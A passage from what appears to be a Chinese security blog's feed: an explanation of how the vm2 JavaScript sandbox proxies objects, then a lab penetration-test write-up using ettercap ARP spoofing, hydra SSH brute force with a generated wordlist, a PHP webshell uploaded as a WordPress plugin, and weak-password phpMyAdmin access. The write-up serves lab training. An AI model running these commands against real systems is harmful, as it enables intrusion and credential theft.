class="built_in">SyntaxError</span>,<span class="built_in">TypeError</span>,<span class="built_in">RegExp</span>,<span class="built_in">Function</span>,<span class="built_in">Object</span>,VMError,<span class="built_in">Proxy</span>,<span class="built_in">Reflect</span>,<span class="built_in">Map</span>,<span class="built_in">WeakMap</span>,<span class="built_in">Set</span>,<span class="built_in">WeakSet</span>,<span class="built_in">Promise</span>&#125;;</span><br></pre></td></tr></table></figure><p>那么vm2中的 <code>contextify.js</code> 究竟做了什么呢？</p><p>最开始定义了一些常量，并且在global和this上添加了相应的属性</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// eslint-disable-next-line no-invalid-this, no-shadow</span></span><br><span class="line"><span class="keyword">const</span> global = <span class="keyword">this</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// global is originally prototype of host.Object so it can be used to climb up from the sandbox.</span></span><br><span class="line"><span class="built_in">Object</span>.setPrototypeOf(global, <span class="built_in">Object</span>.prototype);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.defineProperties(global, &#123;</span><br><span class="line">global: &#123;<span class="attr">value</span>: global&#125;,</span><br><span class="line">GLOBAL: &#123;<span class="attr">value</span>: global&#125;,</span><br><span class="line">root: &#123;<span class="attr">value</span>: global&#125;,</span><br><span class="line">isVM: &#123;<span class="attr">value</span>: <span class="literal">true</span>&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>由于是在函数体外部写了 return 语句，所以webstrom报错，但是实际上这段代码是会被封装到函数中的</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params">host, require</span>)</span>&#123;...&#125;</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/3f069ae5/image-20200530152550918-1591428078972.png" alt></p><p> <code>Contextify</code> 和 <code>Decontextify</code> 都是两个 <code>WeakMap</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Contextified = <span class="keyword">new</span> host.WeakMap();</span><br><span class="line"><span class="keyword">const</span> Decontextified = <span class="keyword">new</span> host.WeakMap();</span><br></pre></td></tr></table></figure><p>WeakMap 是 es6 新增的语法，只接受对象作为键名，并且这些对象是不会被计入垃圾回收机制的，这是为了防止内存泄漏。稍后将会看到，这是用来存储已经被代理过的对象的。</p><p>我们看下第512行， <code>Contextify.readonly</code> 做了些什么</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> LocalBuffer = global.Buffer = Contextify.readonly(host.Buffer, &#123;</span><br><span class="line">allocUnsafe: <span class="function"><span class="keyword">function</span> <span class="title">allocUnsafe</span>(<span class="params">size</span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>.alloc(size);</span><br><span class="line">&#125;,</span><br><span class="line">allocUnsafeSlow: <span class="function"><span class="keyword">function</span> <span class="title">allocUnsafeSlow</span>(<span class="params">size</span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>.alloc(size);</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>函数调用图如下：</p><p>![](vm2实现原理分析/vm2-Page-3 (1)-1591428083714.png)</p><p>你可能会很好奇，为什么需要调用这么多层方法，最后返回的又是一个什么呢？</p><p>我们先来看最后一个调用的方法 <code>Contextify.object</code>,从这里可以很清楚地看到，最后返回了一个代理对象，并且其中还做了一个 <code>Object.assign</code> 的操作</p><p><img src= "/img/loading.gif" data-src="/posts/3f069ae5/image-20200531094815527-1591428086001.png" alt></p><p><code>Object.assign</code>  方法用于将所有可枚举属性的值从一个或多个源对象复制到目标对象。它将返回目标对象。</p><p>比如</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> target = &#123; <span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">2</span> &#125;;</span><br><span class="line"><span class="keyword">const</span> source = &#123; <span class="attr">b</span>: <span class="number">4</span>, <span class="attr">c</span>: <span class="number">5</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> returnedTarget = <span class="built_in">Object</span>.assign(target, source); <span class="comment">// Object &#123; a: 1, b: 4, c: 5 &#125;</span></span><br></pre></td></tr></table></figure><p>也就是说 <code>source</code> 的b 会覆盖掉 target的 <code>b</code> 了</p><p>那么在上图的操作中， <code>deepTraps &gt; traps &gt; {get:..., set: ...}</code> (大于符号代表会覆盖)</p><p>那么我们来看下此时的 <code>deepTraps</code> 是什么</p><p><img src= "/img/loading.gif" data-src="/posts/3f069ae5/image-20200530154835380-1591428091360.png" alt></p><p>你会发现， <code>set, setPrototypeOf ..</code> 这些方法的返回值都是 false，也就是说当你去调用 <code>Buffer.a = 1</code> 的时候(会被代理的set方法拦截)，是无法成功的</p><p>那么此时的 <code>traps</code> 呢</p><p><img src= "/img/loading.gif" data-src="/posts/3f069ae5/image-20200530155017652-1591428100387.png" alt></p><p>这些方法倒是并不会返回false，但是也会在合并的时候，覆盖掉前一个对象的 <code>get和getPrototypeOf</code> </p><p>那至于之前调用的那么多方法，只是为了区分这个对象是哪种类型的，从而给它加上不同的 <code>deepTraps</code> ，到最后一个 <code>Contextify.object</code> 方法调用的时候，将它们合并。</p><p>最终，我们得到了这样一个 <code>Buffer</code> 代理对象，</p><p><img src= "/img/loading.gif" data-src="/posts/3f069ae5/image-20200530155404796-1591428103202.png" alt></p><p>这个 <code>Buffer</code> 代理拦截了如下操作</p><p><img src= "/img/loading.gif" data-src="/posts/3f069ae5/image-20200530155454090-1591428105637.png" alt></p><p>实际上这个 <code>Buffer</code> 本身还是nodesj提供的，但是vm2加了一层代理，所以在vm2的沙箱中访问它的属性时就会被设定的方法拦截</p><p>除此之外，<code>Contextify.object</code> 内部还使用了 <code>WeakMap</code> 来存储已经代理过的对象和对象的代理。</p><p><img src= "/img/loading.gif" data-src="/posts/3f069ae5/image-20200530154336238-1591428108013.png" alt></p><p>所以在vm2的沙箱环境中，如果是内部的对象，由于vm的实现机制保证了内部定义的对象无法逃逸。如果是外部引入的对象，由于vm2提供的代理机制拦截了 <code>constructor</code> 等属性的访问，从而在很大程度上保证了这个沙箱是安全的。</p><p><img src= "/img/loading.gif" data-src="/posts/3f069ae5/image-20200531094815527-1591428110937.png" alt></p><h2 id="代码举例"><a href="#代码举例" class="headerlink" title="代码举例"></a>代码举例</h2><p>为了更深入的了解vm2，我们来调试一段代码</p><p>测试方法,在 <code>main.js</code> 中编写如下代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;VM, VMScript&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">const</span> file = <span class="string">`<span class="subst">$&#123;__dirname&#125;</span>/sandbox.js`</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// By providing a file name as second argument you enable breakpoints</span></span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> VMScript(fs.readFileSync(file), file);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(script));</span><br></pre></td></tr></table></figure><p>然后在 <code>sandbox.js</code> 中编写</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = Buffer.from(<span class="string">""</span>); <span class="comment">//访问Buffer的from属性并调用</span></span><br><span class="line">a.i = <span class="function"><span class="params">()</span> =&gt;</span> &#123;&#125;; <span class="comment">//给对象添加属性</span></span><br><span class="line"><span class="built_in">console</span>.log(a.i); <span class="comment">//访问对象的属性</span></span><br></pre></td></tr></table></figure><p>这样可以在 <code>sandbox.js</code> 中下断点，方便调试运行在沙箱中的代码</p><p>前面已经提到 <code>Buffer</code> 是一个代理对象，访问其所有属性都会被拦截</p><p><img src= "/img/loading.gif" data-src="/posts/3f069ae5/image-20200601145937093-1591428121092.png" alt></p><p>其调用过程如下</p><p><img src= "/img/loading.gif" data-src="/posts/3f069ae5/vm2-Page-4-1591428124235.png" alt></p><p>我们看到，<code>Buffer</code> 代理对象访问其 <code>from</code> 属性，被代理的 <code>get</code> 方法拦截，经过层层的调用，最终返回一个函数代理对象</p><p><img src= "/img/loading.gif" data-src="/posts/3f069ae5/t0112683473174f27fe-1591428127103.png" alt></p><p>之后调用这个函数，就会被 <code>apply</code> 捕获到，拦截的方法如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">apply: <span class="function">(<span class="params">target, context, args</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        context = Decontextify.value(context);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Set context of all arguments to host's context.</span></span><br><span class="line">        <span class="keyword">return</span> Contextify.value(fnc.apply(context, Decontextify.arguments(args)));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> Contextify.value(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用过程如下：</p><p><img src= "/img/loading.gif" data-src="/posts/3f069ae5/vm2-Page-5-1591428129741.png" alt></p><p>按照proxy的规范，target就是未代理之前的函数，context是函数当前运行的上下文，这里是 <code>Buffer</code> 的代理，args是函数的参数，这里是 <code>&quot;&quot;</code></p><p>这里调用了 <code>Decontextify.value</code> ，实际上 <code>Decontextify</code> 的实现和 <code>Contextify</code> 是对称的，只是略微有一点细节上的区别。<code>Decontextify.value</code> 首先会检查 <code>Contextified</code> 中是否有这个对象，如果有直接返回，否则也会针对其进行一层代理</p><p>从这个函数调用过程中我们看到，虽然vm2是针对很多对象都做了代理，但是当实际要发生一次函数调用的时候，必须要将代理的 “外壳” 给剥除掉，并且必须依靠nodejs提供的API来完成，而如果我们能够捕获到这个被剔除代理的对象，那么就能完成vm2的逃逸，这是vm2沙箱逃逸的核心原理</p><p>之后执行</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a.i = <span class="function"><span class="params">()</span> =&gt;</span> &#123;&#125;;</span><br></pre></td></tr></table></figure><p>给a的属性i赋值，被代理的 <code>set</code> 方法拦截</p><p><img src= "/img/loading.gif" data-src="/posts/3f069ae5/image-20200531111221966.png" alt></p><p>这个时候的 <code>value</code> 是一个函数， <code>Decontextify.value</code> 针对其进行了封装，返回一个函数的代理，但是这个函数的代理中：</p><p><img src= "/img/loading.gif" data-src="/posts/3f069ae5/image-20200531111430529.png" alt></p><p>我们看到，如果我们访问这个函数代理对象的 <code>constructor</code> 属性，返回的是 <code>host.Function</code> !</p><p>那我们之后将其取出来是不是就能逃出沙箱了呢？</p><p>我们看最后一行代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(a.i); <span class="comment">//访问对象的属性</span></span><br></pre></td></tr></table></figure><p>此时a内部的i对象，实际上是一个函数的代理对象，当执行 <code>a.i</code> 时，会被代理对象a的 <code>get</code> 方法拦截</p><p><img src= "/img/loading.gif" data-src="/posts/3f069ae5/image-20200531111650333.png" alt></p><p>而不幸的是，vm2的作者显然考虑到了这一点，通过 <code>Contextify.value</code> ，取出被代理之前的对象，所以最终我们得到的还是原来的函数。</p><p><img src= "/img/loading.gif" data-src="/posts/3f069ae5/image-20200531111825969.png" alt></p><p>这样我们就无法获得那个被代理的函数对象了。但是这里终究是有隐患的，如果我们能够获得这个被代理的对象，那么就能借此逃溢出vm2沙箱。至于究竟如何做到，请看下文vm2沙箱逃逸分析</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;本文首发于安全客 &lt;a href=&quot;https://www.anquanke.com/post/id/207283&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.anquanke.com/post/id/207283&lt;/a&gt;&lt;/p&gt;
      
    
    </summary>
    
    
      <category term="代码审计" scheme="https://prontosil.me/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="vm2" scheme="https://prontosil.me/tags/vm2/"/>
    
  </entry>
  
  <entry>
    <title>网安实验综合</title>
    <link href="https://prontosil.me/posts/9fa2ed28/"/>
    <id>https://prontosil.me/posts/9fa2ed28/</id>
    <published>2020-05-24T11:26:24.000Z</published>
    <updated>2020-05-24T11:34:32.540Z</updated>
    
    <content type="html"><![CDATA[<p>实验拓扑图</p><p><img src= "/img/loading.gif" data-src="/posts/9fa2ed28/clipboard.png" alt></p><h2 id="任务1"><a href="#任务1" class="headerlink" title="任务1"></a>任务1</h2><p>192.168.1.3 定时登录 192.168.1.4 的ftp服务，通过分析流量包可以发现</p><p>使用 ettercap 进行网络嗅探</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ettercap -i eth1 -Tq -L sniffeddata -M arp:remote &#x2F;&#x2F;192.168.1.4&#x2F;21&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/9fa2ed28/clipboard-1590319617635.png" alt></p><p>登录ftp服务即可得到 key.txt 内容</p><p>同时还发现 192.168.1.4 存在WebLogic 反序列化漏洞，工具包位于 /home/Hack 目录下</p><p><img src= "/img/loading.gif" data-src="/posts/9fa2ed28/clipboard-1590319617624.png" alt></p><p>读到 key1.txt 内容</p><p><img src= "/img/loading.gif" data-src="/posts/9fa2ed28/clipboard-1590319617828.png" alt></p><h2 id="任务2"><a href="#任务2" class="headerlink" title="任务2"></a>任务2</h2><p>192.168.1.5 运行了 wordpress 站点，访问得到 key2.txt</p><p><img src= "/img/loading.gif" data-src="/posts/9fa2ed28/clipboard-1590319618084.png" alt></p><p>这居然是wordpress后台的密码。(这里没办法利用wordpress-rce那个脚本)</p><p>登录到wordpress后台需要 getshell</p><p>这里下载一个 wordpress 的主题，我下载了这个 <a href="https://wordpress.org/plugins/simple-shortcode-block/" target="_blank" rel="noopener">https://wordpress.org/plugins/simple-shortcode-block/</a></p><p>然后将其中的index.php 修改为一句话木马，通过后台上传，这个时候即getshell</p><p><img src= "/img/loading.gif" data-src="/posts/9fa2ed28/clipboard-1590319618735.png" alt></p><p><img src= "/img/loading.gif" data-src="/posts/9fa2ed28/clipboard-1590319619225.png" alt></p><p>下载 username.txt 即可</p><p><img src= "/img/loading.gif" data-src="/posts/9fa2ed28/clipboard-1590319618894.png" alt></p><h2 id="任务3"><a href="#任务3" class="headerlink" title="任务3"></a>任务3</h2><p>使用hydra 暴力破解 192.168.1.6 的ssh口令，已经知道了口令形式为 hacker***</p><p>直接写个脚本生成下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">password = <span class="string">"hacker"</span></span><br><span class="line"></span><br><span class="line">a = <span class="string">"0123456789"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f = open(<span class="string">"pass.txt"</span>, <span class="string">"w"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> a:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> a:</span><br><span class="line">            ppp = password + i + j + k</span><br><span class="line">            f.writelines(ppp)</span><br><span class="line">            f.writelines(<span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>爆破出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L users.txt -P password.txt -t 1 -vV -e ns 192.168.1.104 ssh</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/9fa2ed28/clipboard-1590319619093.png" alt></p><p>登录之后发现有两块网卡</p><p><img src= "/img/loading.gif" data-src="/posts/9fa2ed28/clipboard-1590319619298.png" alt></p><p>nmap扫描一下</p><p><img src= "/img/loading.gif" data-src="/posts/9fa2ed28/clipboard-1590319619549.png" alt></p><h2 id="任务4"><a href="#任务4" class="headerlink" title="任务4"></a>任务4</h2><p>在 192.168.1.6(centos) 上配置openvpn服务端，在192.168.1.5(windows) 上连接</p><p>通过 scp 拷贝文件到 192.168.1.6 上</p><p>之后yum install一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum localinstall openvpn-2.4.4-1.el7.x86_64.rpm  easy-rsa-2.2.2-1.el5.noarch.rpm  lz4-1.7.5-2.el7.x86_64.rpm pkcs11-helper-1.11-3.el7.x86_64.rpm</span><br></pre></td></tr></table></figure><p>然后开始配置vpn</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@simple openvpn]# cp &#x2F;usr&#x2F;share&#x2F;doc&#x2F;openvpn-2.4.4&#x2F;sample&#x2F;sample-config-files&#x2F;server.conf &#x2F;etc&#x2F;openvpn&#x2F;</span><br><span class="line">[root@simple openvpn]# cd &#x2F;etc&#x2F;openvpn&#x2F;</span><br><span class="line">[root@simple openvpn]# ls</span><br><span class="line">client  server  server.conf</span><br></pre></td></tr></table></figure><p>修改配置文件</p><p><img src= "/img/loading.gif" data-src="/posts/9fa2ed28/clipboard-1590319619430.png" alt></p><p>生成ca</p><p><img src= "/img/loading.gif" data-src="/posts/9fa2ed28/clipboard-1590319619490.png" alt></p><p>生成服务端证书</p><p><img src= "/img/loading.gif" data-src="/posts/9fa2ed28/clipboard-1590319619589.png" alt></p><p>开启openvpn</p><p><img src= "/img/loading.gif" data-src="/posts/9fa2ed28/clipboard-1590319619654.png" alt></p><p>windows配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line">-&gt;|##############################################</span><br><span class="line"># Sample client-side OpenVPN 2.0 config file #</span><br><span class="line"># for connecting to multi-client server.     #</span><br><span class="line">#                                            #</span><br><span class="line"># This configuration can be used by multiple #</span><br><span class="line"># clients, however each client should have   #</span><br><span class="line"># its own cert and key files.                #</span><br><span class="line">#                                            #</span><br><span class="line"># On Windows, you might want to rename this  #</span><br><span class="line"># file so it has a .ovpn extension           #</span><br><span class="line">##############################################</span><br><span class="line"></span><br><span class="line"># Specify that we are a client and that we</span><br><span class="line"># will be pulling certain config file directives</span><br><span class="line"># from the server.</span><br><span class="line">client</span><br><span class="line"></span><br><span class="line"># Use the same setting as you are using on</span><br><span class="line"># the server.</span><br><span class="line"># On most systems, the VPN will not function</span><br><span class="line"># unless you partially or fully disable</span><br><span class="line"># the firewall for the TUN&#x2F;TAP interface.</span><br><span class="line">;dev tap</span><br><span class="line">dev tun</span><br><span class="line"></span><br><span class="line"># Windows needs the TAP-Win32 adapter name</span><br><span class="line"># from the Network Connections panel</span><br><span class="line"># if you have more than one.  On XP SP2,</span><br><span class="line"># you may need to disable the firewall</span><br><span class="line"># for the TAP adapter.</span><br><span class="line">;dev-node MyTap</span><br><span class="line"></span><br><span class="line"># Are we connecting to a TCP or</span><br><span class="line"># UDP server?  Use the same setting as</span><br><span class="line"># on the server.</span><br><span class="line">;proto tcp</span><br><span class="line">proto udp</span><br><span class="line"></span><br><span class="line"># The hostname&#x2F;IP and port of the server.</span><br><span class="line"># You can have multiple remote entries</span><br><span class="line"># to load balance between the servers.</span><br><span class="line">remote 192.168.1.6 1194</span><br><span class="line">;remote my-server-2 1194</span><br><span class="line"></span><br><span class="line"># Choose a random host from the remote</span><br><span class="line"># list for load-balancing.  Otherwise</span><br><span class="line"># try hosts in the order specified.</span><br><span class="line">;remote-random</span><br><span class="line"></span><br><span class="line"># Keep trying indefinitely to resolve the</span><br><span class="line"># host name of the OpenVPN server.  Very useful</span><br><span class="line"># on machines which are not permanently connected</span><br><span class="line"># to the internet such as laptops.</span><br><span class="line">resolv-retry infinite</span><br><span class="line"></span><br><span class="line"># Most clients don&#39;t need to bind to</span><br><span class="line"># a specific local port number.</span><br><span class="line">nobind</span><br><span class="line"></span><br><span class="line"># Downgrade privileges after initialization (non-Windows only)</span><br><span class="line">;user nobody</span><br><span class="line">;group nobody</span><br><span class="line"></span><br><span class="line"># Try to preserve some state across restarts.</span><br><span class="line">persist-key</span><br><span class="line">persist-tun</span><br><span class="line"></span><br><span class="line"># If you are connecting through an</span><br><span class="line"># HTTP proxy to reach the actual OpenVPN</span><br><span class="line"># server, put the proxy server&#x2F;IP and</span><br><span class="line"># port number here.  See the man page</span><br><span class="line"># if your proxy server requires</span><br><span class="line"># authentication.</span><br><span class="line">;http-proxy-retry # retry on connection failures</span><br><span class="line">;http-proxy [proxy server] [proxy port #]</span><br><span class="line"></span><br><span class="line"># Wireless networks often produce a lot</span><br><span class="line"># of duplicate packets.  Set this flag</span><br><span class="line"># to silence duplicate packet warnings.</span><br><span class="line">;mute-replay-warnings</span><br><span class="line"></span><br><span class="line"># SSL&#x2F;TLS parms.</span><br><span class="line"># See the server config file for more</span><br><span class="line"># description.  It&#39;s best to use</span><br><span class="line"># a separate .crt&#x2F;.key file pair</span><br><span class="line"># for each client.  A single ca</span><br><span class="line"># file can be used for all clients.</span><br><span class="line">ca ca.crt</span><br><span class="line">cert client.crt</span><br><span class="line">key client.key</span><br><span class="line"></span><br><span class="line"># Verify server certificate by checking</span><br><span class="line"># that the certicate has the nsCertType</span><br><span class="line"># field set to &quot;server&quot;.  This is an</span><br><span class="line"># important precaution to protect against</span><br><span class="line"># a potential attack discussed here:</span><br><span class="line">#  http:&#x2F;&#x2F;openvpn.net&#x2F;howto.html#mitm</span><br><span class="line">#</span><br><span class="line"># To use this feature, you will need to generate</span><br><span class="line"># your server certificates with the nsCertType</span><br><span class="line"># field set to &quot;server&quot;.  The build-key-server</span><br><span class="line"># script in the easy-rsa folder will do this.</span><br><span class="line">;ns-cert-type server</span><br><span class="line"></span><br><span class="line"># If a tls-auth key is used on the server</span><br><span class="line"># then every client must also have the key.</span><br><span class="line">tls-auth ta.key 1</span><br><span class="line"></span><br><span class="line"># Select a cryptographic cipher.</span><br><span class="line"># If the cipher option is used on the server</span><br><span class="line"># then you must also specify it here.</span><br><span class="line">cipher AES-256-CBC</span><br><span class="line"></span><br><span class="line"># Enable compression on the VPN link.</span><br><span class="line"># Don&#39;t enable this unless it is also</span><br><span class="line"># enabled in the server config file.</span><br><span class="line">;comp-lzo</span><br><span class="line"></span><br><span class="line"># Set log file verbosity.</span><br><span class="line">verb 3</span><br><span class="line"></span><br><span class="line"># Silence repeating messages</span><br><span class="line">mute 20</span><br></pre></td></tr></table></figure><p>连接报错，</p><p><img src= "/img/loading.gif" data-src="/posts/9fa2ed28/clipboard-1590319619815.png" alt></p><blockquote><p>google 知道是时间不同步，手动修改Windows时间正常连接</p></blockquote><p>权限不够</p><p><img src= "/img/loading.gif" data-src="/posts/9fa2ed28/clipboard-1590319619826.png" alt></p><blockquote><p>管理员身份打开命令行，cd到配置文件目录下，输入 openvpn 配置文件名 即可</p></blockquote><p>无法ping 通</p><p><img src= "/img/loading.gif" data-src="https://note.youdao.com/yws/public/resource/1fad93d26e758145d0fe5ef5484d707f/xmlnote/880F9FEB76CC451983ACD136DC135B02/2778" alt></p><p>需要修改服务端配置文件</p><p>成功连接后可以访问到 192.168.2.3</p><p><img src= "/img/loading.gif" data-src="/posts/9fa2ed28/clipboard-1590319620274.png" alt></p><p>弱口令登录 phpmyadmin，得到后台密码 1q2w3e4r</p><p><img src= "/img/loading.gif" data-src="/posts/9fa2ed28/clipboard-1590319620440.png" alt></p><p>将工具拷贝到 192.168.1.5 中</p><p><img src= "/img/loading.gif" data-src="/posts/9fa2ed28/clipboard-1590319620712.png" alt></p><p><img src= "/img/loading.gif" data-src="/posts/9fa2ed28/clipboard-1590319620757.png" alt></p><p>getshell</p><p><img src= "/img/loading.gif" data-src="/posts/9fa2ed28/clipboard-1590319620817.png" alt></p><p>最后得到key</p><p><img src= "/img/loading.gif" data-src="/posts/9fa2ed28/clipboard-1590319621019.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;实验拓扑图&lt;/p&gt;
&lt;p&gt;&lt;img src= &quot;/img/loading.gif&quot; data-src=&quot;/posts/9fa2ed28/clipboard.png&quot; alt&gt;&lt;/p&gt;
&lt;h2 id=&quot;任务1&quot;&gt;&lt;a href=&quot;#任务1&quot; class=&quot;headerlink
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="https://prontosil.me/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="实验" scheme="https://prontosil.me/tags/%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>js沙箱逃逸</title>
    <link href="https://prontosil.me/posts/55470809/"/>
    <id>https://prontosil.me/posts/55470809/</id>
    <published>2020-05-10T12:34:59.000Z</published>
    <updated>2020-05-11T10:04:19.701Z</updated>
    
